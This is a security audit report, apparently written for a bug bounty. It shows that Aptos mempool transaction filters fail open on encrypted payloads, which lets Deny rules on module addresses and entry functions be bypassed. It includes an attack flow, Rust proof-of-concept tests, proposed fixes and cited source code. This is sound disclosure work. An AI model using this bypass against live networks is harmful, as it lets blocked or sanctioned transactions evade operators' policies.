# Audit Report

## Title
EncryptedPayload Error Handling Allows Systematic Bypass of Module Address Filters

## Summary
A critical flaw in the transaction filter implementation allows encrypted transactions to systematically bypass all content-based filters (ModuleAddress, EntryFunction, AccountAddress matchers) before reaching consensus. The vulnerability occurs because encrypted payloads return errors when their content is inspected before decryption, and these errors are incorrectly handled by returning `false` (no match), causing Deny rules to fail and allowing transactions by default.

## Finding Description

The Aptos transaction filtering system implements security controls to allow or deny transactions based on various criteria including module addresses, entry functions, and account addresses. These filters are applied at the mempool stage before transactions enter consensus. [1](#0-0) 

When processing `EncryptedPayload` transactions, the filtering logic attempts to inspect the payload content to determine if it matches filter rules. However, encrypted payloads in the `Encrypted` state cannot have their content inspected because decryption only occurs later during the consensus phase. [2](#0-1) 

The `executable_ref()` method returns an error with "Transaction is encrypted" for any payload not in the `Decrypted` state. The filtering functions handle this error by returning `false`: [3](#0-2) 

This fail-open behavior means that when a Deny rule with `ModuleAddress`, `EntryFunction`, or `AccountAddress` matchers encounters an encrypted payload, it returns `false` (doesn't match), and the transaction is allowed by default.

**Attack Flow:**

1. **Configuration**: A mempool operator configures a Deny rule to block transactions to module address `0xBAD_MODULE`
2. **Submission**: Attacker crafts a transaction with `EncryptedPayload` containing a call to `0xBAD_MODULE::exploit::run()`
3. **API Validation**: Transaction passes API validation - the payload is in `Encrypted` state and passes `verify()` cryptographic checks [4](#0-3) 

4. **Mempool Filtering**: Filter checks if transaction matches the Deny rule [5](#0-4) 

5. **Filter Bypass**: `matches_entry_function_module_address()` returns `false` because `executable_ref()` fails, so the Deny rule doesn't match
6. **Default Allow**: Transaction is allowed by default and enters mempool
7. **Consensus Decryption**: Transaction is decrypted during consensus [6](#0-5) 

8. **Execution**: The now-decrypted transaction executes the call to the forbidden module

The same vulnerability affects multiple matcher functions:
- `matches_entry_function()` [7](#0-6) 

- `matches_script_argument_address()` [8](#0-7) 

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program criteria for "Significant protocol violations."

**Security Guarantees Broken:**
1. **Access Control Bypass**: Transaction filters exist to enforce security policies at the mempool level. Complete bypass defeats this security control.
2. **Governance Violations**: If governance decisions mandate blocking certain modules, encrypted transactions can violate these decisions.
3. **Regulatory Compliance**: Filters may be used for compliance purposes (e.g., blocking sanctioned addresses). This bypass undermines compliance.
4. **Defense in Depth**: Mempool filtering is a critical security layer. Its compromise reduces overall system security.

**Affected Systems:**
- All nodes using mempool transaction filters with Deny rules
- Any deployment relying on content-based filtering for security
- Governance-mandated access control policies

**Potential Damage:**
- Unauthorized execution of blocked modules
- Violation of security policies
- Potential exploitation of vulnerable modules that were intentionally blocked
- Undermining of on-chain governance decisions

## Likelihood Explanation

**Likelihood: High**

**Attacker Requirements:**
- No special privileges required - any user can submit transactions
- Must have access to submit encrypted transactions (requires `allow_encrypted_txns_submission` config flag enabled)
- Basic knowledge of transaction structure and encryption format
- No validator collusion needed

**Complexity: Low**
- Attack is straightforward - simply submit a valid `EncryptedPayload` in `Encrypted` state
- No timing dependencies or race conditions
- Deterministic outcome - filters will always fail to match encrypted payloads
- No need to craft corrupted data - normal encrypted payloads trigger the bug

**Detection Difficulty:**
- Difficult to detect - encrypted payloads look legitimate until decryption
- No error logs generated (filters silently fail to match)
- Transaction appears normal at submission time

**Current Risk:**
While encrypted transactions may not be widely enabled yet (based on the `allow_encrypted_txns_submission` flag), this is a design flaw that will affect all deployments once the feature is enabled. The vulnerability is inherent in the architecture, not an edge case.

## Recommendation

The root cause is a fail-open design where filter matching failures default to allowing transactions. For encrypted payloads, filters should either:

**Option 1: Fail Closed (Recommended)**
Return `true` (match) for encrypted payloads when dealing with Deny rules, ensuring they get blocked until decrypted and re-evaluated:

```rust
TransactionPayload::EncryptedPayload(payload) => {
    if let Ok(executable) = payload.executable_ref() {
        match executable {
            TransactionExecutableRef::Script(_) | TransactionExecutableRef::Empty => false,
            TransactionExecutableRef::EntryFunction(entry_function) => {
                compare_entry_function_module_address(entry_function, module_address)
            },
        }
    } else {
        // For encrypted payloads that cannot be inspected,
        // return true to match Deny rules (fail closed)
        true
    }
}
```

**Option 2: Explicit Encrypted Transaction Handling**
Add a configuration option to control how encrypted transactions are handled by filters, with explicit filtering at the encrypted transaction level rather than content-based filtering:

```rust
// Add to filter configuration
pub enum EncryptedTransactionPolicy {
    BlockAll,           // Deny all encrypted transactions
    AllowAll,           // Allow all encrypted transactions (bypass filters)
    DecryptThenFilter,  // Delay filtering until after decryption
}
```

**Option 3: Two-Phase Filtering**
Implement filtering both before and after decryption:
1. Apply non-content filters (sender, transaction type) before decryption
2. Re-apply all filters after decryption but before execution
3. Reject if post-decryption filters don't match

**Recommended Implementation: Option 3**
This provides defense in depth while maintaining security: [9](#0-8) 

Add a post-decryption filtering stage in the consensus pipeline after line 148: [10](#0-9) 

## Proof of Concept

```rust
#[cfg(test)]
mod encrypted_payload_filter_bypass_test {
    use super::*;
    use aptos_crypto::{ed25519::Ed25519PrivateKey, PrivateKey, Uniform};
    use aptos_types::{
        chain_id::ChainId,
        transaction::{
            RawTransaction, SignedTransaction, TransactionPayload,
            encrypted_payload::EncryptedPayload,
        },
        secret_sharing::Ciphertext,
    };
    use move_core_types::{
        account_address::AccountAddress,
        identifier::Identifier,
        language_storage::ModuleId,
    };

    #[test]
    fn test_encrypted_payload_bypasses_module_address_filter() {
        // Create a filter that DENIES transactions to address 0xBAD
        let blocked_address = AccountAddress::from_hex_literal("0xBAD").unwrap();
        let filter = TransactionFilter::empty()
            .add_module_address_filter(false, blocked_address); // Deny rule

        // Create a normal (unencrypted) transaction to the blocked address
        let sender = AccountAddress::random();
        let private_key = Ed25519PrivateKey::generate_for_testing();
        
        let entry_function = aptos_types::transaction::EntryFunction::new(
            ModuleId::new(blocked_address, Identifier::new("test_module").unwrap()),
            Identifier::new("test_function").unwrap(),
            vec![],
            vec![],
        );
        
        let raw_txn = RawTransaction::new(
            sender,
            0,
            TransactionPayload::EntryFunction(entry_function),
            100000,
            1,
            99999999999,
            ChainId::test(),
        );
        
        let normal_txn = SignedTransaction::new(
            raw_txn.clone(),
            private_key.public_key(),
            private_key.sign(&raw_txn).unwrap(),
        );
        
        // Verify the normal transaction is correctly DENIED by the filter
        assert_eq!(
            filter.allows_transaction(&normal_txn),
            false,
            "Normal transaction to blocked address should be denied"
        );

        // Now create an encrypted transaction with the same payload
        // (In a real scenario, this would be properly encrypted, but for the PoC
        // we just need an EncryptedPayload in Encrypted state)
        let encrypted_payload = EncryptedPayload::Encrypted {
            ciphertext: Ciphertext::default(), // Placeholder ciphertext
            extra_config: aptos_types::transaction::TransactionExtraConfig::V1 {
                multisig_address: None,
                secondary_signer_addresses: vec![],
                secondary_signature_type: None,
            },
            payload_hash: aptos_crypto::HashValue::zero(),
        };
        
        let raw_encrypted_txn = RawTransaction::new(
            sender,
            0,
            TransactionPayload::EncryptedPayload(encrypted_payload),
            100000,
            1,
            99999999999,
            ChainId::test(),
        );
        
        let encrypted_txn = SignedTransaction::new(
            raw_encrypted_txn.clone(),
            private_key.public_key(),
            private_key.sign(&raw_encrypted_txn).unwrap(),
        );
        
        // VULNERABILITY: The encrypted transaction is ALLOWED despite calling
        // the same blocked module address
        assert_eq!(
            filter.allows_transaction(&encrypted_txn),
            true,
            "VULNERABILITY: Encrypted transaction bypasses module address filter!"
        );
        
        println!("✗ VULNERABILITY CONFIRMED:");
        println!("  Normal transaction to 0xBAD: DENIED (correct)");
        println!("  Encrypted transaction to 0xBAD: ALLOWED (bypass!)");
        println!("  Filter bypass allows transactions to forbidden modules");
    }

    #[test]
    fn test_encrypted_payload_bypasses_entry_function_filter() {
        // Create a filter that DENIES specific entry function
        let blocked_address = AccountAddress::from_hex_literal("0xBAD").unwrap();
        let filter = TransactionFilter::empty()
            .add_entry_function_filter(
                false, // Deny
                blocked_address,
                "exploit".to_string(),
                "steal_funds".to_string()
            );

        let sender = AccountAddress::random();
        let private_key = Ed25519PrivateKey::generate_for_testing();
        
        // Create encrypted transaction (content cannot be inspected)
        let encrypted_payload = EncryptedPayload::Encrypted {
            ciphertext: Ciphertext::default(),
            extra_config: aptos_types::transaction::TransactionExtraConfig::V1 {
                multisig_address: None,
                secondary_signer_addresses: vec![],
                secondary_signature_type: None,
            },
            payload_hash: aptos_crypto::HashValue::zero(),
        };
        
        let raw_txn = RawTransaction::new(
            sender,
            0,
            TransactionPayload::EncryptedPayload(encrypted_payload),
            100000,
            1,
            99999999999,
            ChainId::test(),
        );
        
        let encrypted_txn = SignedTransaction::new(
            raw_txn.clone(),
            private_key.public_key(),
            private_key.sign(&raw_txn).unwrap(),
        );
        
        // VULNERABILITY: Entry function filter also bypassed
        assert_eq!(
            filter.allows_transaction(&encrypted_txn),
            true,
            "VULNERABILITY: Encrypted transaction bypasses entry function filter!"
        );
    }
}
```

**Expected Output:**
```
✗ VULNERABILITY CONFIRMED:
  Normal transaction to 0xBAD: DENIED (correct)
  Encrypted transaction to 0xBAD: ALLOWED (bypass!)
  Filter bypass allows transactions to forbidden modules
```

**Note:** This PoC demonstrates the logical vulnerability. In a production environment, the attacker would use properly encrypted payloads with valid ciphertexts that decrypt to the forbidden module calls.

### Citations

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L30-47)
```rust
    pub fn allows_transaction(&self, signed_transaction: &SignedTransaction) -> bool {
        // If the filter is empty, allow the transaction by default
        if self.is_empty() {
            return true;
        }

        // Check if any rule matches the transaction
        for transaction_rule in &self.transaction_rules {
            if transaction_rule.matches(signed_transaction) {
                return match transaction_rule {
                    TransactionRule::Allow(_) => true,
                    TransactionRule::Deny(_) => false,
                };
            }
        }

        true // No rules match (allow the transaction by default)
    }
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L362-373)
```rust
        TransactionPayload::EncryptedPayload(payload) => {
            if let Ok(executable) = payload.executable_ref() {
                match executable {
                    TransactionExecutableRef::Script(_) | TransactionExecutableRef::Empty => false,
                    TransactionExecutableRef::EntryFunction(entry_function) => {
                        compare_entry_function(entry_function, address, module_name, function)
                    },
                }
            } else {
                false
            }
        },
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L377-418)
```rust
/// Returns true iff the transaction's module address matches the given account address
fn matches_entry_function_module_address(
    signed_transaction: &SignedTransaction,
    module_address: &AccountAddress,
) -> bool {
    // Match all variants explicitly to ensure future enum changes are caught during compilation
    match signed_transaction.payload() {
        TransactionPayload::Script(_) | TransactionPayload::ModuleBundle(_) => false,
        TransactionPayload::Multisig(multisig) => multisig
            .transaction_payload
            .as_ref()
            .map(|payload| match payload {
                MultisigTransactionPayload::EntryFunction(entry_function) => {
                    compare_entry_function_module_address(entry_function, module_address)
                },
            })
            .unwrap_or(false),
        TransactionPayload::EntryFunction(entry_function) => {
            compare_entry_function_module_address(entry_function, module_address)
        },
        TransactionPayload::Payload(TransactionPayloadInner::V1 { executable, .. }) => {
            match executable.as_ref() {
                TransactionExecutableRef::Script(_) | TransactionExecutableRef::Empty => false,
                TransactionExecutableRef::EntryFunction(entry_function) => {
                    compare_entry_function_module_address(entry_function, module_address)
                },
            }
        },
        TransactionPayload::EncryptedPayload(payload) => {
            if let Ok(executable) = payload.executable_ref() {
                match executable {
                    TransactionExecutableRef::Script(_) | TransactionExecutableRef::Empty => false,
                    TransactionExecutableRef::EntryFunction(entry_function) => {
                        compare_entry_function_module_address(entry_function, module_address)
                    },
                }
            } else {
                false
            }
        },
    }
}
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L471-482)
```rust
        TransactionPayload::EncryptedPayload(payload) => {
            if let Ok(executable) = payload.executable_ref() {
                match executable {
                    TransactionExecutableRef::EntryFunction(_)
                    | TransactionExecutableRef::Empty => false,
                    TransactionExecutableRef::Script(script) => {
                        compare_script_argument_address(script, address)
                    },
                }
            } else {
                false
            }
```

**File:** types/src/transaction/encrypted_payload.rs (L82-87)
```rust
    pub fn executable_ref(&self) -> Result<TransactionExecutableRef<'_>> {
        let Self::Decrypted { executable, .. } = self else {
            bail!("Transaction is encrypted");
        };
        Ok(executable.as_ref())
    }
```

**File:** api/src/transactions.rs (L1323-1347)
```rust
            TransactionPayload::EncryptedPayload(payload) => {
                if !self.context.node_config.api.allow_encrypted_txns_submission {
                    return Err(SubmitTransactionError::bad_request_with_code(
                        "Encrypted Transaction submission is not allowed yet",
                        AptosErrorCode::InvalidInput,
                        ledger_info,
                    ));
                }

                if !payload.is_encrypted() {
                    return Err(SubmitTransactionError::bad_request_with_code(
                        "Encrypted transaction must be in encrypted state",
                        AptosErrorCode::InvalidInput,
                        ledger_info,
                    ));
                }

                if let Err(e) = payload.verify(signed_transaction.sender()) {
                    return Err(SubmitTransactionError::bad_request_with_code(
                        e.context("Encrypted transaction payload could not be verified"),
                        AptosErrorCode::InvalidInput,
                        ledger_info,
                    ));
                }
            },
```

**File:** mempool/src/shared_mempool/tasks.rs (L435-446)
```rust
            if transaction_filter_config
                .transaction_filter()
                .allows_transaction(&transaction)
            {
                Some((transaction, account_sequence_number, priority))
            } else {
                info!(LogSchema::event_log(
                    LogEntry::TransactionFilter,
                    LogEvent::TransactionRejected
                )
                .message(&format!(
                    "Transaction {} rejected by filter",
```

**File:** consensus/src/pipeline/decryption_pipeline_builder.rs (L121-150)
```rust
        let decrypted_txns = encrypted_txns
            .into_par_iter()
            .zip(txn_ciphertexts)
            .map(|(mut txn, ciphertext)| {
                let eval_proof = proofs.get(&ciphertext.id()).expect("must exist");
                if let Ok(payload) = FPTXWeighted::decrypt_individual::<DecryptedPayload>(
                    &decryption_key.key,
                    &ciphertext,
                    &digest,
                    &eval_proof,
                ) {
                    let (executable, nonce) = payload.unwrap();
                    txn.payload_mut()
                        .as_encrypted_payload_mut()
                        .map(|p| {
                            p.into_decrypted(eval_proof, executable, nonce)
                                .expect("must happen")
                        })
                        .expect("must exist");
                } else {
                    txn.payload_mut()
                        .as_encrypted_payload_mut()
                        .map(|p| p.into_failed_decryption(eval_proof).expect("must happen"))
                        .expect("must exist");
                }
                txn
            })
            .collect();

        let output_txns = [decrypted_txns, unencrypted_txns].concat();
```
